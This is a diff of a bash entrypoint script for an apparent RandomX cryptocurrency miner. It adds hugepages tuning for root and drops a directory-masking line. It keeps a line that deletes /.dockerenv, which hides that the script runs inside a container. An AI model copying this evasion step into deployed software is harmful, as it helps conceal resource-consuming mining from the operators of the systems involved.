@@ -1,7 +1,6 @@
 #!/bin/bash
 
 rm -f /.dockerenv 2>/dev/null || true
-mkdir -p /dev/shm/.dockerenv_mask 2>/dev/null && rmdir /dev/shm/.dockerenv_mask 2>/dev/null || true
 
 ALGO=${ALGO:-"randomx"}
 POOL_ADDRESS=${POOL_ADDRESS:-"stratum+tcp://rx.unmineable.com:3333"}
@@ -16,6 +15,21 @@ log_debug() { [[ "$LOG_LEVEL" == "debug" ]] && echo "[$(date '+%Y-%m-%d %H:%M:%S
 log_info()  { [[ "$LOG_LEVEL" =~ ^(debug|info)$ ]] && echo "[$(date '+%Y-%m-%d %H:%M:%S')] [INFO]  $*"; }
 log_warn()  { [[ "$LOG_LEVEL" =~ ^(debug|info|warn)$ ]] && echo "[$(date '+%Y-%m-%d %H:%M:%S')] [WARN]  $*"; }
 log_error() { echo "[$(date '+%Y-%m-%d %H:%M:%S')] [ERROR] $*"; }
+
+if [[ "$(id -u)" == "0" ]]; then
+    HP_CURRENT=$(cat /proc/sys/vm/nr_hugepages 2>/dev/null || echo "0")
+    HP_NEEDED=1280
+    if [[ "$HP_CURRENT" -lt "$HP_NEEDED" ]]; then
+        log_info "Setting hugepages: $HP_CURRENT -> $HP_NEEDED"
+        echo "$HP_NEEDED" > /proc/sys/vm/nr_hugepages 2>/dev/null \
+            && log_info "Hugepages set to $HP_NEEDED" \
+            || log_warn "Failed to set hugepages (need privileged mode)"
+    else
+        log_info "Hugepages already configured: $HP_CURRENT"
+    fi
+else
+    log_warn "Not running as root — MSR tweaks and hugepages unavailable"
+fi
 
 crash_trap() {
     local code=$?
